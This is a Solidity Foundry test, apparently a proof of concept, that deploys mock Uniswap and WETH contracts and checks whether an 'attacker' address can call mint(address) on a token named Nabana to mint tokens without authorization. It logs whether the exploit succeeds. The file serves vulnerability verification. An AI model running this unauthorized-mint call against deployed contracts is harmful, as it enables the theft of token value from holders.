// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Nabana.sol";

contract MockWETH {
    function deposit() external payable {}
    function transfer(address, uint256) external pure returns (bool) { return true; }
    function withdraw(uint256) external {}
}

contract MockUniswapV2Factory {
    address public pair;

    constructor(address _pair) {
        pair = _pair;
    }

    function createPair(address, address) external view returns (address) {
        return pair;
    }
}

contract MockUniswapV2Router {
    address public immutable factory;
    address public immutable weth;

    constructor(address _factory, address _weth) {
        factory = _factory;
        weth = _weth;
    }

    function WETH() external view returns (address) {
        return weth;
    }
}

contract NabanaMintVulnerabilityTest is Test {
    Nabana token;
    address owner = makeAddr("owner");
    address vestingAddr = address(0x123);
    address attacker = makeAddr("attacker");
    MockWETH weth;

    function setUp() public {
        weth = new MockWETH();
        address mockPair = address(0x456);
        MockUniswapV2Factory factory = new MockUniswapV2Factory(mockPair);
        MockUniswapV2Router router = new MockUniswapV2Router(address(factory), address(weth));
        
        // Patch Uniswap router address
        vm.etch(0x10ED43C718714eb63d5aA57B78B54704E256024E, address(router).code);

        vm.startPrank(owner);
        token = new Nabana(vestingAddr);
        vm.stopPrank();
    }

    function testUnauthorizedMinting() public {
        uint256 initialBalance = token.balanceOf(attacker);
        uint256 initialSupply = token.totalSupply();

        console.log("--- BEFORE-Trigger ---");
        console.log("Attacker balance before: ", initialBalance);
        console.log("Total supply before: ", initialSupply);
        console.log("--- Trigger: Call mint function by attacker ---");
        
        // Attempt to mint directly through token contract
        vm.prank(attacker);
        (bool success, ) = address(token).call(
            abi.encodeWithSignature("mint(address)", attacker)
        );
        console.log("Call result: ", success ? "success" : "failure");
        
        uint256 finalBalance = token.balanceOf(attacker);
        uint256 finalSupply = token.totalSupply();
        console.log("--- AFTER-Trigger ---");
        console.log("Attacker balance after: ", finalBalance);
        console.log("Total supply after: ", finalSupply);
        
        // Vulnerability exists if call succeeded AND either balance or supply changed
        bool stateChanged = (finalBalance != initialBalance) || (finalSupply != initialSupply);
        console.log("State changed: ", stateChanged ? "YES" : "NO");
        console.log("Exploit result: %s | state %s", 
            success ? "SUCCESS" : "FAIL", 
            stateChanged ? "CHANGED" : "UNCHANGED");
        
        // Final verdict based on both criteria
        if (success && stateChanged) {
            console.log("Vulnerability Exists: Attacker successfully minted tokens arbitrarily.");
        } else {
            console.log("Vulnerability not Exist: Attack failed or caused no state change.");
        }
    }
}